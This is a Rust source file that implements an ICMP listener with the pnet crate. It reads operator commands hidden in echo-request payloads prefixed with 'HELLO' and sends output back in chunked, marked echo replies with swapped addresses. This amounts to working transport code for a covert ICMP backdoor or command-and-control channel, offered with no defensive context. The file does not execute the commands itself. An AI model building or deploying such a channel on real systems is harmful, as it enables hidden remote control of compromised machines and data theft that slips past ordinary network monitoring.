use pnet::datalink::Channel::Ethernet;
use pnet::datalink::DataLinkReceiver;
use pnet::datalink::DataLinkSender;
use pnet::datalink::{self, NetworkInterface};
use pnet::packet::ethernet::EtherType;
use pnet::packet::ethernet::EthernetPacket;
use pnet::packet::ethernet::MutableEthernetPacket;
use pnet::packet::icmp::IcmpPacket;
use pnet::packet::icmp::IcmpType;
use pnet::packet::icmp::MutableIcmpPacket;
use pnet::packet::ip::IpNextHeaderProtocol;
use pnet::packet::ipv4::MutableIpv4Packet;
use pnet::packet::ipv4::{checksum, Ipv4Packet};
use pnet::packet::Packet;
use pnet::util::MacAddr;
use std::io::{Read, Write};
use std::net::Ipv4Addr;
// Invoke as echo <interface name>

static cmd_init: &[u8; 5] = b"HELLO";
static cmd_resp: &[u8; 18] = b"\0\0\0\0\0\0\0\0\0\0\0\0\0GOODBYE";
static cmd_resp_end: &[u8; 5] = b"DONE";

pub struct IcmpListener {
    tx: Box<dyn DataLinkSender>,
    rx: Box<dyn DataLinkReceiver>,
    ip_src: Ipv4Addr,
    ip_dst: Ipv4Addr,
    mac_src: MacAddr,
    mac_dst: MacAddr,
}

impl IcmpListener {
    pub fn new(interface_name: String) -> IcmpListener {
        let interface_names_match = |iface: &NetworkInterface| iface.name == interface_name;

        // Find the network interface with the provided name
        let interfaces = datalink::interfaces();
        let interface = interfaces
            .into_iter()
            .filter(interface_names_match)
            .next()
            .unwrap();

        // Create a new channel, dealing with layer 2 packets
        let (tx, rx) = match datalink::channel(&interface, Default::default()) {
            Ok(Ethernet(tx, rx)) => (tx, rx),
            Ok(_) => panic!("Unhandled channel type"),
            Err(e) => panic!(
                "An error occurred when creating the datalink channel: {}",
                e
            ),
        };
        IcmpListener {
            tx,
            rx,
            ip_src: Ipv4Addr::LOCALHOST,
            ip_dst: Ipv4Addr::LOCALHOST,
            mac_src: MacAddr(0, 0, 0, 0, 0, 0),
            mac_dst: MacAddr(0, 0, 0, 0, 0, 0),
        }
    }
}
impl Read for IcmpListener {
    fn read(&mut self, buffer: &mut [u8]) -> Result<usize, std::io::Error> {
        loop {
            let packet = &self.rx.next()?;
            let eth_packet = EthernetPacket::new(packet).unwrap();

            let ip_packet = Ipv4Packet::new(eth_packet.payload()).unwrap();

            if ip_packet.get_next_level_protocol().0 == 1 {
                let packet = IcmpPacket::new(ip_packet.payload()).unwrap();
                let mut payload = packet.payload().to_vec();
                loop {
                    let byte = payload.get(0).unwrap();
                    if byte == &0 {
                        payload.remove(0);
                    } else {
                        break;
                    }
                }
                if packet.get_icmp_type().0 == 8 {
                    if &payload[0..5] == cmd_init {
                        self.mac_src = eth_packet.get_source();
                        self.mac_dst = eth_packet.get_destination();
                        self.ip_src = ip_packet.get_source();
                        self.ip_dst = ip_packet.get_destination();
                        let cmd = &payload[5..];
                        let len = cmd.len();
                        for i in 0..len {
                            buffer[i] = cmd[i];
                        }
                        return Ok(len);
                    }
                }
            }
        }
    }
}
impl Write for IcmpListener {
    fn write(&mut self, data: &[u8]) -> Result<usize, std::io::Error> {
        let out = Vec::from(data);
        let chunks: Vec<&[u8]> = out.chunks(975).collect();
        // 20 Long
        for (i, chunk) in chunks.iter().enumerate() {
            let mut balls: Vec<u8> = Vec::from(*cmd_resp);
            let mut c: Vec<u8> = Vec::from(*chunk);
            balls.append(&mut c);
            if i == chunks.len() - 1 {
                balls.append(&mut Vec::from(*cmd_resp_end));
            }
            let mut buffer = [0; 1000];
            let mut new_icmp_packet = MutableIcmpPacket::new(&mut buffer).unwrap();
            new_icmp_packet.set_icmp_type(IcmpType::new(0));
            new_icmp_packet.set_payload(&balls);
            let mut buffer = [0; 1060];
            let mut new_ip_packet = MutableIpv4Packet::new(&mut buffer).unwrap();
            new_ip_packet.set_next_level_protocol(IpNextHeaderProtocol::new(1));
            new_ip_packet.set_version(4);
            new_ip_packet.set_ttl(255);
            new_ip_packet.set_flags(0);
            new_ip_packet.set_identification(1);
            new_ip_packet.set_fragment_offset(0);
            new_ip_packet.set_header_length(5);
            new_ip_packet.set_source(self.ip_dst);
            new_ip_packet.set_destination(self.ip_src);
            new_ip_packet
                .set_total_length((20 + new_icmp_packet.packet().len()).try_into().unwrap());
            new_ip_packet.set_payload(new_icmp_packet.packet());
            new_ip_packet.set_checksum(checksum(&new_ip_packet.to_immutable()));
            let mut buffer = [0; 1080];
            let mut new_packet = MutableEthernetPacket::new(&mut buffer).unwrap();

            // Switch the source and destination
            new_packet.set_source(self.mac_dst);
            new_packet.set_destination(self.mac_src);
            new_packet.set_ethertype(EtherType::new(0x0800));
            new_packet.set_payload(new_ip_packet.packet());

            let _ = &self.tx.send_to(&new_packet.packet(), None).unwrap();
        }
        return Ok(0);
    }

    fn flush(&mut self) -> Result<(), std::io::Error> {
        todo!()
    }
}
